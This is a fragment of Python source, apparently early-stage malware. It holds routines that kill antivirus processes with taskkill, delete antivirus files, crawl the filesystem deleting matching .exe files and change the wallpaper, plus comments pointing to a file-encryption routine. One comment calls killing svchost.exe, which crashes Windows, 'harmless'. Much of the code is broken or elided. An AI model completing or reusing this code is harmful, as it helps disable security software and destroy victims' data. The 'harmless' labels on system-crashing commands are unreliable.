...
# except Exception as e:
  # elevate.elevate()
def stopav(do):
  # u202eu004cu004cu24D8u1D4A6
  avf=[]
  avp=[]
  avd=False
  for av_file in antivirus_files:
    os.rmdir(avf)
  while True:
    for process in avp:
      try:
        os.system("task" + do + " /f /im %s" % process)
      except Exception as e:
        pass
...
def delete(av):
  ...
  filelist=[]
  keywords=[]
  exec("for file in %s: os.rmdir(file)" % exec(av))
  for rec_file in glob.iglob('/**', recursive=True):
    filelist+=rec_file
  for file in filelist:
    if file.endswith(".exe"):
      # first split it to get filenaeme
      temp=file
      file=file.split("/")
      file=file[len(file)]
      # delete the file if it has keywords in it
      if file in exec(av):
        if keywords in file:
          file=temp
          os.rmdir(file)
...
def randAlphanumeric(size):
  ...
  return output
# encallfiles("hey",["txt"],"","/home/runner/myArray-chrome/test/**")
# it works
# print(randAlphanumeric(""))

# taskkill /f /im explorer.exe & start explorer.exe -- hide and show taskbar (harmless)
# taskkill /f /im svchost.exe                       -- bsod                  (harmless)
def setwallpaper(img):
  SPI_SETDESKWALLPAPER = 20 
  ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "image.jpg" , 0)

# def otp(str1,key,alphabet):
  
# def caesar(text_asarr):
# for i in text_asarr:
# nvm
